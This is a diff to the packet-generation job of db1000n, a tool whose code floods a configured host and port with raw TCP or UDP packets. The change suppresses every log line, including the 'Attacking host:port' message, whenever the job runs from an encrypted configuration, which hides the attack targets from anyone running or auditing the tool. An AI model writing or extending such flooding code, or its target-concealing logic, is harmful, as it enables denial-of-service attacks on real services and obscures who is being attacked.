@@ -15,7 +15,7 @@ import (
 	"github.com/Arriven/db1000n/src/utils/templates"
 )
 
-func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
+func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
 	ctx, cancel := context.WithCancel(ctx)
 	defer cancel()
 	defer utils.PanicHandler()
@@ -31,7 +31,9 @@ func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args, deb
 	var jobConfig packetgenJobConfig
 
 	if err := utils.Decode(args, &jobConfig); err != nil {
-		log.Printf("Error parsing json: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing json: %v", err)
+		}
 
 		return nil, err
 	}
@@ -40,7 +42,9 @@ func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args, deb
 
 	port, err := strconv.Atoi(templates.ParseAndExecute(jobConfig.Port, nil))
 	if err != nil {
-		log.Printf("Error parsing port: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing port: %v", err)
+		}
 
 		return nil, err
 	}
@@ -55,12 +59,16 @@ func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args, deb
 
 	packetTpl, err := templates.ParseMapStruct(jobConfig.Packet)
 	if err != nil {
-		log.Printf("Error parsing packet: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing packet: %v", err)
+		}
 
 		return nil, err
 	}
 
-	log.Printf("Attacking %v:%v", host, port)
+	if !isInEncryptedContext(ctx) {
+		log.Printf("Attacking %v:%v", host, port)
+	}
 
 	protocolLabelValue := "tcp"
 	if _, ok := jobConfig.Packet["udp"]; ok {
@@ -73,7 +81,9 @@ func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args, deb
 
 	rawConn, err := packetgen.OpenRawConnection(jobConfig.Network)
 	if err != nil {
-		log.Printf("Error building raw connection: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error building raw connection: %v", err)
+		}
 
 		return nil, err
 	}
@@ -83,20 +93,25 @@ func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args, deb
 
 	for jobConfig.Next(ctx) {
 		packetConfigRaw := packetTpl.Execute(nil)
-		if debug {
+		if globalConfig.Debug && !isInEncryptedContext(ctx) {
 			log.Printf("[packetgen] Rendered packet config template:\n%s", packetConfigRaw)
 		}
 
 		var packetConfig packetgen.PacketConfig
 		if err := mapstructure.WeakDecode(packetConfigRaw, &packetConfig); err != nil {
-			log.Printf("Error parsing json: %v", err)
+			if !isInEncryptedContext(ctx) {
+				log.Printf("Error parsing json: %v", err)
+			}
 
 			return nil, err
 		}
 
 		n, err := packetgen.SendPacket(packetConfig, rawConn, host, port)
 		if err != nil {
-			log.Printf("Error sending packet: %v", err)
+			if !isInEncryptedContext(ctx) {
+				log.Printf("Error sending packet: %v", err)
+			}
+
 			metrics.IncPacketgen(
 				host,
 				hostPort,
